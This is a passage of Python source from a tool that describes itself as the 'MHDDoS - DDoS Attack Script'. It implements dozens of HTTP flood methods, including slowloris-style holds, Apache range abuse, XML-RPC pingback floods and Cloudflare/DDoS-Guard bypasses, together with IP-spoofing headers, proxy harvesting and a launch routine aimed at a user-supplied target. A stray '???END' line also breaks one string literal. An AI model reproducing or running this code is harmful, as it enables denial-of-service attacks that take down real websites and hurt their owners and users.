        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
???END
                         'Cache-Control: max-age=0\r\n'
                         'Connection: keep-alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return ("X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f'X-Forwarded-For: {spoof}\r\n'
                f'Real-IP: {spoof}\r\n')

    def generate_payload(self, other: str = None) -> bytes:
        return str.encode((self._payload +
                           f"Host: {self._target.authority}\r\n" +
                           self.randHeadercontent +
                           (other if other else "") +
                           "\r\n"))

    def open_connection(self, host=None) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(.9)
        sock.connect(host or self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock,
                                   server_hostname=host[0] if host else self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    @property
    def randHeadercontent(self) -> str:
        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.SpoofIP)

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                            "DYN", "SLOW", "PPS", "APACHE",
                                            "BOT", "RHEX", "STOMP"} \
            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"

    def POST(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 44\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
        s = None
        with  suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def TOR(self) -> None:
        provider = "." + randchoice(tor2webs)
        target = self._target.authority.replace(".onion", provider)
        payload: Any = str.encode(self._payload +
                                  f"Host: {target}\r\n" +
                                  self.randHeadercontent +
                                  "\r\n")
        s = None
        target = self._target.host.replace(".onion", provider), self._raw_target[1]
        with suppress(Exception), self.open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STRESS(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 524\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
             ProxyTools.Random.rand_str(32)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def APACHE(self) -> None:
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                            for i in range(1, 1024)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def XMLRPC(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 345\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/xml\r\n\r\n"
             "<?xml version='1.0' encoding='iso-8859-1'?>"
             "<methodCall><methodName>pingback.ping</methodName>"
             "<params><param><value><string>%s</string></value>"
             "</param><param><value><string>%s</string>"
             "</value></param></params></methodCall>") %
            (ProxyTools.Random.rand_str(64),
             ProxyTools.Random.rand_str(64)))[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def PPS(self) -> None:
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, self._defaultpayload)
        Tools.safe_close(s)

    def KILLER(self) -> None:
        while True:
            Thread(target=self.GET, daemon=True).start()

    def GET(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOT(self) -> None:
        payload: bytes = self.generate_payload()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                          ProxyTools.Random.rand_str(4)) +
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            Tools.send(s, p2)
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def EVEN(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            while Tools.send(s, payload) and s.recv(1):
                continue
        Tools.safe_close(s)

    def OVH(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def CFBUAM(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, payload)
            sleep(5.01)
            ts = time()
            for _ in range(self._rpc):
                Tools.send(s, payload)
                if time() > ts + 120: break
        Tools.safe_close(s)

    def AVB(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DGB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            if self._proxies:
                pro = randchoice(self._proxies)
                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as ss:
                    for _ in range(min(self._rpc, 5)):
                        sleep(min(self._rpc, 5) / 100)
                        with ss.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            BYTES_SEND += Tools.sizeOfRequest(res)
                            continue

                Tools.safe_close(ss)

            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)

            Tools.safe_close(ss)

    def DYN(self):
        payload: Any = str.encode(self._payload +
                                  f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n" +
                                  self.randHeadercontent +
                                  "\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DOWNLOADER(self):
        payload: Any = self.generate_payload()

        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
                while 1:
                    sleep(.01)
                    data = s.recv(1)
                    if not data:
                        break
            Tools.send(s, b'0')
        Tools.safe_close(s)

    def BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def GSB(self):
        payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                           self._target.raw_path_qs,
                                                           ProxyTools.Random.rand_str(6)) +
                             "Host: %s\r\n" % self._target.authority +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: Keep-Alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def RHEX(self):
        randhex = str(randbytes(randchoice([32, 64, 128])))
        payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                        self._target.authority,
                                                        randhex) +
                             "Host: %s/%s\r\n" % (self._target.authority, randhex) +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: keep-alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STOMP(self):
        dep = ('Accept-Encoding: gzip, deflate, br\r\n'
               'Accept-Language: en-US,en;q=0.9\r\n'
               'Cache-Control: max-age=0\r\n'
               'Connection: keep-alive\r\n'
               'Sec-Fetch-Dest: document\r\n'
               'Sec-Fetch-Mode: navigate\r\n'
               'Sec-Fetch-Site: none\r\n'
               'Sec-Fetch-User: ?1\r\n'
               'Sec-Gpc: 1\r\n'
               'Pragma: no-cache\r\n'
               'Upgrade-Insecure-Requests: 1\r\n\r\n')
        hexh = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
               r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
               r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
               r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
               r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
               r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
               r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
               r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
               r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
               r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
               r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
        p1, p2 = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                       self._target.authority,
                                                       hexh) +
                            "Host: %s/%s\r\n" % (self._target.authority, hexh) +
                            self.randHeadercontent + dep), str.encode(
            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type,
                                                          self._target.authority) +
            "Host: %s\r\n" % hexh +
            self.randHeadercontent + dep)
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            for _ in range(self._rpc):
                Tools.send(s, p2)
        Tools.safe_close(s)

    def NULL(self) -> None:
        payload: Any = str.encode(self._payload +
                                  f"Host: {self._target.authority}\r\n" +
                                  "User-Agent: null\r\n" +
                                  "Referrer: null\r\n" +
                                  self.SpoofIP + "\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOMB(self):
        assert self._proxies, \
            'This method requires proxies. ' \
            'Without proxies you can use github.com/codesenberg/bombardier'

        while True:
            proxy = randchoice(self._proxies)
            if proxy.type != ProxyType.SOCKS4:
                break

        res = run(
            [
                f'{bombardier_path}',
                f'--connections={self._rpc}',
                '--http2',
                '--method=GET',
                '--latencies',
                '--timeout=30s',
                f'--requests={self._rpc}',
                f'--proxy={proxy}',
                f'{self._target.human_repr()}',
            ],
            stdout=PIPE,
        )
        if self._thread_id == 0:
            print(proxy, res.stdout.decode(), sep='\n')

    def SLOW(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
            while Tools.send(s, payload) and s.recv(1):
                for i in range(self._rpc):
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                    Tools.send(s, keep)
                    sleep(self._rpc / 15)
                    break
        Tools.safe_close(s)

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        if name == "POST":
            self.SENT_FLOOD = self.POST
        if name == "CFB":
            self.SENT_FLOOD = self.CFB
        if name == "CFBUAM":
            self.SENT_FLOOD = self.CFBUAM
        if name == "XMLRPC":
            self.SENT_FLOOD = self.XMLRPC
        if name == "BOT":
            self.SENT_FLOOD = self.BOT
        if name == "APACHE":
            self.SENT_FLOOD = self.APACHE
        if name == "BYPASS":
            self.SENT_FLOOD = self.BYPASS
        if name == "DGB":
            self.SENT_FLOOD = self.DGB
        if name == "OVH":
            self.SENT_FLOOD = self.OVH
        if name == "AVB":
            self.SENT_FLOOD = self.AVB
        if name == "STRESS":
            self.SENT_FLOOD = self.STRESS
        if name == "DYN":
            self.SENT_FLOOD = self.DYN
        if name == "SLOW":
            self.SENT_FLOOD = self.SLOW
        if name == "GSB":
            self.SENT_FLOOD = self.GSB
        if name == "RHEX":
            self.SENT_FLOOD = self.RHEX
        if name == "STOMP":
            self.SENT_FLOOD = self.STOMP
        if name == "NULL":
            self.SENT_FLOOD = self.NULL
        if name == "COOKIE":
            self.SENT_FLOOD = self.COOKIES
        if name == "TOR":
            self.SENT_FLOOD = self.TOR
        if name == "PPS":
            self.SENT_FLOOD = self.PPS
            self._defaultpayload = (
                    self._defaultpayload +
                    f"Host: {self._target.authority}\r\n\r\n").encode()
        if name == "EVEN": self.SENT_FLOOD = self.EVEN
        if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
        if name == "BOMB": self.SENT_FLOOD = self.BOMB
        if name == "KILLER": self.SENT_FLOOD = self.KILLER


class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
                providrs))
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@MHTools:~#"

        while 1:
            cmd = input(cons + " ").strip()
            if not cmd: continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue

            if (cmd == "E") or \
                    (cmd == "EXIT") or \
                    (cmd == "Q") or \
                    (cmd == "QUIT") or \
                    (cmd == "LOGOUT") or \
                    (cmd == "CLOSE"):
                exit(-1)

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & ToolsConsole.METHODS:
                print(f"{cmd} command not found")
                continue

            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)

                    while True:
                        sleep(1)

                        od = ld
                        ld = net_io_counters(pernic=False)

                        t = [(last - now) for now, last in zip(od, ld)]

                        logger.info(
                            ("Bytes Sent %s\n"
                             "Bytes Recived %s\n"
                             "Packets Sent %s\n"
                             "Packets Recived %s\n"
                             "ErrIn %s\n"
                             "ErrOut %s\n"
                             "DropIn %s\n"
                             "DropOut %s\n"
                             "Cpu Usage %s\n"
                             "Memory %s\n") %
                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),
                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),
                             t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
                             str(virtual_memory().percent) + "%"))
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue

            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f'{cons}give-me-ipaddress# ')
                        if not domain: continue
                        if domain.upper() == "BACK": break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if (domain.upper() == "E") or \
                                (domain.upper() == "EXIT") or \
                                (domain.upper() == "Q") or \
                                (domain.upper() == "QUIT") or \
                                (domain.upper() == "LOGOUT") or \
                                (domain.upper() == "CLOSE"):
                            exit(-1)
                        if "/" not in domain: continue
                        logger.info("please wait ...")

                        with get(domain, timeout=20) as r:
                            logger.info(('status_code: %d\n'
                                         'status: %s') %
                                        (r.status_code, "ONLINE"
                                        if r.status_code <= 500 else "OFFLINE"))

            if cmd == "INFO":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.info(domain)

                    if not info["success"]:
                        print("Error!")
                        continue

                    logger.info(("Country: %s\n"
                                 "City: %s\n"
                                 "Org: %s\n"
                                 "Isp: %s\n"
                                 "Region: %s\n") %
                                (info["country"], info["city"], info["org"],
                                 info["isp"], info["region"]))

            if cmd == "TSSRV":
                while True:
                    domain = input(f'{cons}give-me-domain# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.ts_srv(domain)
                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")

            if cmd == "PING":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)

                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]

                    logger.info("please wait ...")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(('Address: %s\n'
                                 'Ping: %d\n'
                                 'Aceepted Packets: %d/%d\n'
                                 'status: %s\n') %
                                (r.address, r.avg_rtt, r.packets_received,
                                 r.packets_sent,
                                 "ONLINE" if r.is_alive else "OFFLINE"))

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def usage():
        print((
                  '* MHDDoS - DDoS Attack Script With %d Methods\n'
                  'Note: If the Proxy list is empty, the attack will run without proxies\n'
                  '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                  '      Proxy Type 0 = All in config.json\n'
                  '      SocksTypes:\n'
                  '         - 6 = RANDOM\n'
                  '         - 5 = SOCKS5\n'
                  '         - 4 = SOCKS4\n'
                  '         - 1 = HTTP\n'
                  '         - 0 = ALL\n'
                  ' > Methods:\n'
                  ' - Layer4\n'
                  ' | %s | %d Methods\n'
                  ' - Layer7\n'
                  ' | %s | %d Methods\n'
                  ' - Tools\n'
                  ' | %s | %d Methods\n'
                  ' - Others\n'
                  ' | %s | %d Methods\n'
                  ' - All %d Methods\n'
                  '\n'
                  'Example:\n'
                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                  ' Amplification)>\n') %
              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
               ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
               ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               argv[0], argv[0], argv[0], argv[0]))

    # noinspection PyBroadException
    @staticmethod
    def ts_srv(domain):
        records = ['_ts3._udp.', '_tsdns._tcp.']
        DnsResolver = resolver.Resolver()
        DnsResolver.timeout = 1
        DnsResolver.lifetime = 1
        Info = {}
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, 'SRV')
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(
                        srv.port)
            except:
                Info[rec] = 'Not found'

        return Info

    # noinspection PyUnreachableCode
    @staticmethod
    def info(domain):
        with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
            return s.json()
        return {"success": False}


def handleProxyList(con, proxy_li, proxy_ty, url=None):
    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
    if not proxy_li.exists():
        logger.warning(
            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
            )
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=1, threads=threads,
                url=url.human_repr() if url else "http://httpbin.org/get",
            )

            if not Proxies:
                exit(
                    "Proxy Check failed, Your network may be the problem"
                    " | The target may not be available."
                )
            stringBuilder = ""
            for proxy in Proxies:
                stringBuilder += (proxy.__str__() + "\n")
            wr.write(stringBuilder)

    proxies = ProxyUtiles.readFromFile(proxy_li)
    if proxies:
        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
    else:
        logger.info(
            f"{bcolors.WARNING}Empty Proxy File, running flood witout proxy{bcolors.RESET}")
        proxies = None

    return proxies


if __name__ == '__main__':
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                ToolsConsole.runConsole()
            if one == "STOP":
                ToolsConsole.stop()

            method = one
            host = None
            port = None
            url = None
            event = Event()
            event.clear()
            target = None
            urlraw = argv[2].strip()
            if not urlraw.startswith("http"):
                urlraw = "http://" + urlraw

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found %s" %
                     ", ".join(Methods.ALL_METHODS))

            if method in Methods.LAYER7_METHODS:
                url = URL(urlraw)
                host = url.host

                if method != "TOR":
                    try:
                        host = gethostbyname(url.host)
                    except Exception as e:
                        exit('Cannot resolve hostname ', url.host, str(e))

                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])
                proxy_ty = int(argv[3].strip())
                proxy_li = Path(__dir__ / "files/proxies/" /
                                argv[5].strip())
                useragent_li = Path(__dir__ / "files/useragent.txt")
                referers_li = Path(__dir__ / "files/referers.txt")
                bombardier_path = Path.home() / "go/bin/bombardier"
                proxies: Any = set()

                if method == "BOMB":
                    assert (
                            bombardier_path.exists()
                            or bombardier_path.with_suffix('.exe').exists()
                    ), (
                        "Install bombardier: "
                        "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
                    )

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                if not useragent_li.exists():
                    exit("The Useragent file doesn't exist ")
                if not referers_li.exists():
                    exit("The Referer file doesn't exist ")

                uagents = set(a.strip()
                              for a in useragent_li.open("r+").readlines())
                referers = set(a.strip()
                               for a in referers_li.open("r+").readlines())

                if not uagents: exit("Empty Useragent File ")
